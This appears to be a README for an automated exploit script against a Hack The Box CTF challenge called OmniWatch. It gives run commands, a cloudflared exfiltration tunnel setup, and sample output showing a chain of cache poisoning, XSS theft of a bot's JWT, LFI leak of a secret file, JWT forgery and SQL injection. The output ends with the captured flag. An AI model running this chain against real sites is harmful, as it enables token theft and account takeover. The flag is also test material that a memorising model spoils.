# OmniWatch Exploit - Usage Guide

## Quick Start (3 Steps)

### Step 1: Install Dependencies

```bash
pip3 install requests flask pyjwt
```

### Step 2: Setup Exfiltration Endpoint

**Option A: Using cloudflared (Recommended)**

```bash
# In Terminal 1:
cloudflared tunnel --url http://localhost:9090

# Copy the URL shown (e.g., https://xxx-yyy.trycloudflare.com)
```

**Option B: Using the helper script**

```bash
# In Terminal 1:
./setup_exfil.sh

# Copy the URL shown
```

### Step 3: Run the Exploit

```bash
# In Terminal 2:
python3 omniwatch_exploit.py <HOST> <PORT> <EXFIL_URL>

# Example:
python3 omniwatch_exploit.py 83.136.252.27 44963 https://wonder-reality-harper-yen.trycloudflare.com
```

## Expected Output

```
╔═══════════════════════════════════════════════════════════════════════╗
║                  OmniWatch CTF Exploit Script                         ║
║                Production-Ready Automated Exploit                     ║
╚═══════════════════════════════════════════════════════════════════════╝

Configuration:
  Target:           http://83.136.252.27:44963
  Exfil Server:     https://wonder-reality-harper-yen.trycloudflare.com
  Local Port:       9090
  Bot Check:        Every 1s
  Bot Login Delay:  3s
  Request Timeout:  10s
  Verbose:          True

[*] [06:01:23] Testing connectivity to target...
[+] [06:01:23] Target is reachable (HTTP 301)
[*] [06:01:23] Starting multi-stage exploit chain...
[*] [06:01:23] Stage 1: Cache poisoning with XSS
[*] [06:01:23] Stage 2: JWT secret leakage via LFI
[*] [06:01:23] Stage 3: Administrator JWT forgery
[*] [06:01:23] Stage 4: Signature injection via SQLi
[*] [06:01:23] Stage 5: Flag retrieval from admin panel

[*] [06:01:23] Starting exfiltration server on port 9090
[+] [06:01:25] Exfiltration server ready
[*] [06:01:25] Starting bot monitoring loop...
[*] [06:01:25] Checking every 1 second(s)
[+] [06:01:42] Bot is RUNNING - poisoning cache now!
[+] [06:01:45] Cache poisoned successfully!
[*] [06:01:45] XSS payload cached for 10 seconds
[*] [06:01:45] Waiting for XSS to trigger...
[+] [06:01:48] JWT token stolen from bot!
[*] [06:01:48] Starting exploit chain with stolen JWT...
[*] [06:01:48] Exploiting LFI to leak JWT secret...
[+] [06:01:49] JWT secret leaked: 8^9A{+trX&...xyz
[*] [06:01:50] Forging administrator JWT...
[+] [06:01:50] Administrator JWT forged!
[*] [06:01:51] Injecting forged signature via SQL injection...
[+] [06:01:51] SQL injection executed successfully!
[*] [06:01:53] Accessing admin panel with forged JWT...

================================================================================
FLAG RETRIEVED:
HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_32cc9fb86d949294d9f72755bf22e120}
================================================================================

[+] [06:01:53] Flag saved to /tmp/omniwatch_flag.txt
[+] [06:01:53] Exploit completed successfully!
[+] [06:01:55] Mission accomplished!
[*] [06:01:55] Exploit terminated
```

## Command-Line Options

```bash
python3 omniwatch_exploit.py <HOST> <PORT> <EXFIL_URL>
```

**Arguments:**
- `HOST`: Target IP address (e.g., 83.136.252.27)
- `PORT`: Target port (e.g., 44963)
- `EXFIL_URL`: Your public exfiltration endpoint URL

## Troubleshooting

### "Cannot reach target"
- Verify target IP and port are correct
- Check your internet connection
- Try: `curl -I http://<HOST>:<PORT>`

### "Exfiltration server error"
- Port 9090 might be in use
- Kill existing process: `pkill -f omniwatch`
- Try again

### "JWT not received"
- Exfiltration URL might not be publicly accessible
- If using ngrok, try cloudflared instead (no interstitial page)
- Verify cloudflared/ngrok is still running in other terminal

### "Bot not running"
- Bot runs every 30 seconds, be patient
- Script automatically waits and retries
- Check target is still up: `curl http://<HOST>:<PORT>/controller/bot_running`

### "Flag not found in response"
- The signature injection might have failed
- Re-run the exploit (it will try again on next bot cycle)
- Check that SQLi executed successfully in logs

## Output Files

- `/tmp/omniwatch_flag.txt` - Retrieved flag is saved here

## Advanced Usage

### Verbose Mode (Default)
Shows detailed debug information:
```python
Config.VERBOSE = True
```

### Quiet Mode
Modify script line 28:
```python
Config.VERBOSE = False
```

### Custom Timeouts
Modify script configuration section:
```python
Config.REQUEST_TIMEOUT = 15  # Increase if slow network
Config.BOT_LOGIN_DELAY = 4   # Increase if bot needs more time
```

## Security Notes

- This script is for authorized CTF/educational purposes only
- Do not use against systems you don't own or have permission to test
- The exploit creates a temporary web server on port 9090
- All processes are cleaned up on exit (Ctrl+C)

## Exploit Chain Summary

1. **CRLF Injection** → Inject HTTP headers in Zig oracle service
2. **Cache Poisoning** → Poison Varnish cache with XSS payload
3. **XSS** → Steal moderator JWT from Chromium bot
4. **LFI** → Leak `/app/jwt_secret.txt` using moderator access
5. **JWT Forgery** → Create administrator JWT with leaked secret
6. **SQL Injection** → Inject forged signature into database
7. **Privilege Escalation** → Access admin panel and retrieve flag

## Requirements

- Python 3.6+
- pip packages: requests, flask, pyjwt
- cloudflared or ngrok for public endpoint
- Network access to target

## Support

If the exploit fails:
1. Check all requirements are installed
2. Verify target is accessible
3. Ensure exfiltration endpoint is public and reachable
4. Review the error messages in colored output
5. Try running with a fresh cloudflared tunnel

## License

Educational/CTF use only. MIT License.
